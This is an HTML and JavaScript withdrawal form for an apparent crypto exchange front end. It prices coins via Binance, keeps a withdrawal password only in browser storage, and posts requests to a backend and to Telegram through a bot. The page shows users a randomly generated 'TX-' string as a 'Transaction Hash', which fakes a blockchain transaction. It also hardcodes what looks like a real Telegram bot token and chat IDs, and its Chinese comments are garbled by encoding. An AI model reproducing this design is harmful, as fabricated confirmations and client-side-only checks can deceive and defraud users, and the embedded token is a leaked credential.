<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Withdrawal</title>
<style>
  /* åŸæ · UI æ ·å¼ï¼Œæœªæ”¹åŠ¨ */
  * { box-sizing: border-box; }
  body { background-color: transparent; font-family: Arial, sans-serif; margin: 0; padding: 0; width: 100%; overflow-x: hidden; }
  .withdraw-box { width: 100%; max-width: 450px; margin: 30px auto; padding: 25px; border-radius: 12px; background: transparent !important; color: white; }
  select, input, button { width: 100%; max-width: 100%; padding: 12px; margin-top: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.6); background: transparent !important; color: white; font-size: 15px; display: block; }
  select option { color: black; }
  button { cursor: pointer; font-weight: bold; border: none; background: #0099cc; }
  button:disabled { background: #444; }
  .row { display: flex; justify-content: space-between; gap: 10px; width: 100%; }
  #copyHashBtn, #submitBtn { display: none; width: 48%; }
  #usdtText { text-align: right; color: #00ff00; font-size: 13px; }
  #hashBox { color: #00ff00; margin-top: 10px; white-space: pre-line; font-size: 14px; overflow-wrap: break-word; }
</style>
</head>
<body>
  <div class="withdraw-box">
    <h2 style="text-align:center;"></h2>
    <label>Select Cryptocurrency</label>
    <select id="coin" onchange="updateUSDT()">
      <!-- same options -->
      <option value="BTC">BTC</option><option value="ETH">ETH</option><option value="USDT">USDT</option><option value="BNB">BNB</option><option value="XRP">XRP</option><option value="ADA">ADA</option><option value="SOL">SOL</option><option value="DOGE">DOGE</option><option value="TRX">TRX</option><option value="DOT">DOT</option><option value="MATIC">MATIC</option><option value="LTC">LTC</option><option value="AVAX">AVAX</option><option value="UNI">UNI</option><option value="ETC">ETC</option><option value="ATOM">ATOM</option><option value="XMR">XMR</option><option value="FIL">FIL</option><option value="APT">APT</option><option value="ARB">ARB</option>
    </select>

    <label>Enter Coin Amount</label>
    <input id="amount" placeholder="Enter amount" oninput="updateUSDT()" />
    <div id="usdtText">USDT Equivalent: <span id="usdtValue">0</span></div>

    <label>Password</label>
    <input type="password" id="password" placeholder="Enter password" />
    <div class="row">
      <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
      <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
    </div>
    <button onclick="forgotPassword()">Forgot Password?</button>
    <label>Wallet Address</label>
    <input id="wallet" placeholder="Paste wallet address" />
    <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>
    <div id="hashBox"></div>
    <div class="row">
      <button id="copyHashBtn" onclick="copyHash()">Copy Hash</button>
      <button id="submitBtn" onclick="submitWithdrawal()">Submit Withdrawal</button>
    </div>
  </div>

<script>
/* ---------- å…¼å®¹ä¸å®¹é”™ä¿®å¤ï¼ˆä¸æ”¹ UIï¼‰ ---------- */

/*
  åŠŸèƒ½è¦ç‚¹ï¼š
  - åç«¯æäº¤ï¼šä¼˜å…ˆ /proxy/withdraw -> å›é€€ /api/order/withdrawï¼ˆä¿æŒå’Œç®¡ç†åå°ä¸€è‡´ï¼‰
  - ä¸‰è·¯é€šçŸ¥ï¼šç®¡ç†åå°ï¼ˆHTTP POSTï¼‰ + Telegram ç§èŠï¼ˆç®¡ç†å‘˜IDï¼‰ + Telegram ç¾¤ï¼ˆç¾¤IDï¼‰
  - US/Eastern æ—¶é—´ï¼ˆtime_us å­—æ®µï¼‰
  - Binance å®æ—¶æ¢ç®—ï¼šæŒ‰é€‰ä¸­å¸ç§å»ºç«‹å•å¸ WS è®¢é˜…ï¼ˆsymbolusdt@tickerï¼‰ï¼Œå¤±è´¥æ—¶å›é€€åˆ° REST æŸ¥è¯¢
  - ä¸ä¿®æ”¹ä»»ä½• CSS / HTMLï¼ˆåªæ”¹ JS é€»è¾‘ï¼‰
*/

/* é…ç½®ï¼ˆå¦‚éœ€æ›¿æ¢ BOT_TOKENï¼Œè¯·æ›¿æ¢æ­¤å¤„ï¼‰ */
const API_BASE = "https://crypto-management-production-5e04.up.railway.app";
const BACKEND_PROXY = `${API_BASE}/proxy/withdraw`;
const BACKEND_FALLBACK = `${API_BASE}/api/order/withdraw`;

// Telegram é…ç½®ï¼ˆç”±ä½ æä¾›ï¼‰
const BOT_TOKEN = "8528337731:AAGb6D_TRPKYSQrxA7s4TAizsPjNqnajhrU"; // å¦‚éœ€æ›¿æ¢ï¼Œç›´æ¥æ›¿æ¢æ­¤å˜é‡
const ADMIN_TELEGRAM_ID = "6062973135";
const GROUP_TELEGRAM_ID = "-1003122480155";

/* helpers */
function sleep(ms){ return new Promise(res=>setTimeout(res, ms)); }
async function postWithFallback(urls, options={}, retries=1, delay=500){
  for (let i=0;i<urls.length;i++){
    const u = urls[i];
    try{
      for (let r=0;r<=retries;r++){
        try{
          const res = await fetch(u, options);
          // treat 2xx as success
          if(res && res.ok) return res;
          // on 404/500, retry fallback
          if(r===retries) break;
        }catch(e){
          if(r===retries) throw e;
          await sleep(delay);
        }
      }
    }catch(e){
      // try next url
    }
  }
  throw new Error('All urls failed');
}

/* æ—¶é—´ä¸ç”¨æˆ· id */
function formatUsTime(ts){
  const d = ts ? new Date(Number(ts)) : new Date();
  // produce like: 02/24/2025, 11:23:45 AM -> remove comma for consistency if you want
  return d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:true }).replace(',', '');
}
function getUserId(){
  try{
    const url = new URLSearchParams(window.location.search);
    let uid = url.get("userid") || localStorage.getItem("userid4");
    if(!uid){ uid = Math.floor(1000+Math.random()*9000).toString(); localStorage.setItem("userid4", uid); }
    // éé˜»å¡åŒæ­¥åˆ°åç«¯ï¼ˆå¯æ•è·ï¼‰
    (async ()=>{ try{ await fetch(`${API_BASE}/api/users/sync`, { method:'POST', headers:{'Content-Type':'application/json','X-User-Id':uid}, body: JSON.stringify({ userid: uid }) }); }catch(e){} })();
    return uid;
  }catch(e){ return '0000'; }
}
const USERID = getUserId();

/* Binance å®æ—¶æ¢ç®— - å•å¸è®¢é˜…ï¼ˆæ¯”å…¨é‡ !ticker@arr æ›´ç¨³å®šï¼‰ */
let ws = null;
let wsSymbol = null;
let currentPrice = 0;
let wsHeartbeatTimer = null;
let wsReconnectTimer = null;

async function connectSymbolWS(symbol){
  // symbol example: BTC -> subscribe btcusdt@ticker
  try{
    const symLower = symbol.toLowerCase();
    const url = `wss://stream.binance.com:9443/ws/${symLower}usdt@ticker`;
    if(ws){
      try{ ws.onclose = null; ws.onerror = null; ws.close(); }catch(e){}
      ws = null; currentPrice = 0;
    }
    wsSymbol = symbol;
    ws = new WebSocket(url);
    ws.onopen = ()=> {
      // clear timers
      if(wsReconnectTimer){ clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
      scheduleHeartbeat();
      // console.log('WS open for', symbol);
    };
    ws.onmessage = (ev)=>{
      try{
        const d = JSON.parse(ev.data);
        // d.c is close price
        if(d && d.c) currentPrice = parseFloat(d.c);
        updateUSDT();
        // reset heartbeat
        if(wsHeartbeatTimer) clearTimeout(wsHeartbeatTimer);
        scheduleHeartbeat();
      }catch(e){}
    };
    ws.onclose = ()=>{
      // reconnect with backoff
      scheduleReconnect(symbol);
    };
    ws.onerror = (e)=>{
      try{ ws.close(); }catch(e){}
    };
  }catch(e){
    scheduleReconnect(symbol);
  }
}
function scheduleHeartbeat(){
  // expected messages frequently; if none in 25s, close to trigger reconnect
  if(wsHeartbeatTimer) clearTimeout(wsHeartbeatTimer);
  wsHeartbeatTimer = setTimeout(()=>{ try{ if(ws) ws.close(); }catch(e){} }, 25000);
}
function scheduleReconnect(symbol){
  if(wsReconnectTimer) clearTimeout(wsReconnectTimer);
  wsReconnectTimer = setTimeout(()=>{ connectSymbolWS(symbol); }, 3000);
}

// fallback to REST price if WS fails or no price yet
async function fetchPriceREST(symbol){
  try{
    const resp = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
    const j = await resp.json();
    if(j && j.price) return parseFloat(j.price);
  }catch(e){}
  return 0;
}

/* æ›´æ–° USDT æ˜¾ç¤º â€”â€” ä¿æŒåŸ UI å…ƒç´  id ä¸å˜ */
async function updateUSDT(){
  try{
    const coin = document.getElementById("coin").value;
    const amount = parseFloat(document.getElementById("amount").value || 0);
    // if price is zero, try fetch REST
    if(!currentPrice && coin){
      const restPrice = await fetchPriceREST(coin);
      if(restPrice) currentPrice = restPrice;
    }
    const price = currentPrice || 0;
    const usdtVal = (amount * price);
    document.getElementById("usdtValue").innerText = isNaN(usdtVal) ? '0' : usdtVal.toFixed(6);
  }catch(e){}
}

/* åˆ‡æ¢å¸ç§æ—¶å¯åŠ¨å•å¸ WS */
document.getElementById("coin").addEventListener('change', (e)=>{
  const coin = e.target.value;
  if(coin === 'USDT'){
    // USDT itself -> price 1
    currentPrice = 1;
    updateUSDT();
    if(ws){ try{ ws.onclose = null; ws.close(); }catch(e){} ws=null; }
    return;
  }
  connectSymbolWS(coin);
});

/* åˆå§‹ï¼šå¦‚æœé€‰æ‹©äº†é»˜è®¤å¸ç§ï¼Œå°è¯•è¿æ¥ */
(function initDefaultWS(){
  const c = document.getElementById("coin").value;
  if(c && c !== 'USDT') connectSymbolWS(c);
  else { currentPrice = 1; updateUSDT(); }
})();

/* å¯†ç ç³»ç»Ÿï¼ˆä¿æŒä½ çš„é€»è¾‘ï¼‰ */
let storedPassword = localStorage.getItem("withdraw_password");
let passwordConfirmed = false;
window.onload = () => { if (storedPassword) document.getElementById("createPwdBtn").style.display = "none"; };
function createPassword(){ if(storedPassword) return alert("Password already created."); storedPassword = Math.random().toString(36).substr(2,6).toUpperCase(); localStorage.setItem("withdraw_password", storedPassword); alert("Your Password: "+storedPassword+"\n\nğŸ¤– Please change your withdrawal password immediately."); document.getElementById("createPwdBtn").style.display = "none"; }
function confirmPassword(){ const input = document.getElementById("password").value; if(input === storedPassword){ passwordConfirmed = true; alert("Password confirmed!"); } else alert("Wrong password!"); }
function forgotPassword(){ if(!storedPassword) return alert("Password not created."); const oldp = prompt("Enter current password:"); if(oldp !== storedPassword) return alert("Wrong password."); const newp = prompt("Enter new password (min 4 chars):"); if(!newp || newp.length<4) return alert("Too short."); storedPassword = newp; localStorage.setItem("withdraw_password", newp); alert("Password updated!"); }

/* WALLET + HASHï¼ˆä¿æŒ UIï¼‰ */
let txHash = null;
function confirmWallet(){ if(!passwordConfirmed) return alert("Confirm password first."); const wallet = document.getElementById("wallet").value; if(!wallet) return alert("Enter wallet address."); txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase(); document.getElementById("hashBox").innerText = "Transaction Hash:\n" + txHash; document.getElementById("copyHashBtn").style.display = "block"; document.getElementById("submitBtn").style.display = "block"; document.getElementById("walletBtn").disabled = true; }
function copyHash(){ navigator.clipboard.writeText(txHash); alert("Hash copied!"); }

/* Telegram é€šçŸ¥ï¼šå‘é€æ–‡æœ¬ +ï¼ˆå¯é€‰ï¼‰å›¾ç‰‡ */
async function telegramSendMessage(chatId, text){
  try{
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
    return res;
  }catch(e){ console.warn('tg sendMessage error', e); return null; }
}
async function telegramSendPhoto(chatId, fileBlob){
  try{
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('photo', fileBlob, 'screenshot.jpg');
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
    return res;
  }catch(e){ console.warn('tg sendPhoto error', e); return null; }
}

/* å°†å›¾ç‰‡ file è½¬ä¸º Blobï¼ˆå¦‚æœæ˜¯ DataURLï¼‰*/
async function fileToBlob(file){
  // if already Blob/File return as-is
  if(file instanceof Blob) return file;
  return null;
}

/* æäº¤å‡½æ•°ï¼ˆæ ¸å¿ƒï¼‰ */
async function submitWithdrawal(){
  try{
    const coin = document.getElementById("coin").value;
    const amount = document.getElementById("amount").value;
    const usdt = document.getElementById("usdtValue").innerText;
    const wallet = document.getElementById("wallet").value;
    const fileInput = document.getElementById('uploadFile');
    const file = fileInput && fileInput.files && fileInput.files[0] ? fileInput.files[0] : null;

    if(!passwordConfirmed) return alert("Confirm password first.");
    if(!wallet) return alert("Enter wallet address.");
    if(!amount || isNaN(Number(amount)) || Number(amount) <= 0) return alert("Enter valid amount.");

    const orderId = `WDL-${new Date().toISOString().slice(0,10).replace(/-/g,'')}-${Math.floor(100000 + Math.random()*900000)}`;
    const usTime = formatUsTime(Date.now());
    const payload = { userid: USERID, coin, amount, wallet, usdt, hash: txHash, orderId, timestamp: Date.now(), time_us: usTime };

    // æŒ‰é’®çŠ¶æ€
    const submitBtnEl = document.getElementById("submitBtn");
    submitBtnEl.disabled = true; submitBtnEl.style.opacity = "0.7"; submitBtnEl.textContent = "Submitting...";

    // 1) å‘é€åˆ°ç®¡ç†åå°ï¼ˆä¼˜å…ˆ proxy -> fallbackï¼‰
    let backendOk = false;
    try{
      const res = await postWithFallback([BACKEND_PROXY, BACKEND_FALLBACK], { method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': USERID }, body: JSON.stringify(payload) }, 1, 500);
      if(res && res.ok){
        backendOk = true;
      } else {
        backendOk = false;
      }
    }catch(e){
      backendOk = false;
    }

    // 2) å‘é€ Telegram é€šçŸ¥ï¼ˆæ— è®ºåå°æ˜¯å¦æˆåŠŸå°½åŠ›å‘é€ï¼‰â€”â€”å¹¶è¡Œå‘é€ï¼Œä¸é˜»å¡æ•´ä½“æˆåŠŸè·¯å¾„
    const text = `<b>New Withdraw Request</b>\nUser: ${USERID}\nCoin: ${coin}\nAmount: ${amount}\nUSDT: ${usdt}\nWallet: ${wallet}\nHash: ${txHash || 'None'}\nTime (US/Eastern): ${usTime}\nOrder ID: ${orderId}`;
    // send to both admin and group
    try{
      // send text messages
      telegramSendMessage(ADMIN_TELEGRAM_ID, text).catch(()=>{});
      telegramSendMessage(GROUP_TELEGRAM_ID, text).catch(()=>{});
      // send photo if exists
      if(file){
        // we can directly send the file Blob
        telegramSendPhoto(ADMIN_TELEGRAM_ID, file).catch(()=>{});
        telegramSendPhoto(GROUP_TELEGRAM_ID, file).catch(()=>{});
      }
    }catch(e){
      console.warn('telegram notify error', e);
    }

    // ç»“æœå¤„ç†
    if(backendOk){
      alert("Withdrawal submitted!");
      document.getElementById("hashBox").innerText += `\n\nOrder ID: ${orderId}\nTime (US): ${usTime}`;
      submitBtnEl.textContent = "Submitted";
      submitBtnEl.style.background = "#555";
    } else {
      alert("åå°æäº¤å¤±è´¥ï¼Œè¯·ç¨ååœ¨åå°ç¡®è®¤æˆ–é‡è¯•ã€‚ç³»ç»Ÿå·²å°è¯•å‘é€ Telegram é€šçŸ¥ã€‚");
      submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
    }
  }catch(e){
    console.error('submitWithdrawal error', e);
    alert("Network error: æäº¤å¤±è´¥ï¼Œè¯·ç¨ååœ¨åå°ç¡®è®¤æˆ–é‡è¯•ã€‚");
    const submitBtnEl = document.getElementById("submitBtn");
    submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
  }
}

/* æ—§çš„ postWithFallback æ¥å£ä»å¯ç”¨ï¼ˆæ— éœ€æ›´æ”¹ï¼‰ */
/* ä¿æŒé¡µé¢åŸæœ‰è¡Œä¸ºï¼šhash copyã€confirmWallet ç­‰åŠŸèƒ½ä¸å˜ */

</script>

<!-- ä¿ç•™ auth ä¸ nexbit -->
<script src="js/auth.js"></script>
<script src="js/nexbit-api.js"></script>
</body>
</html>
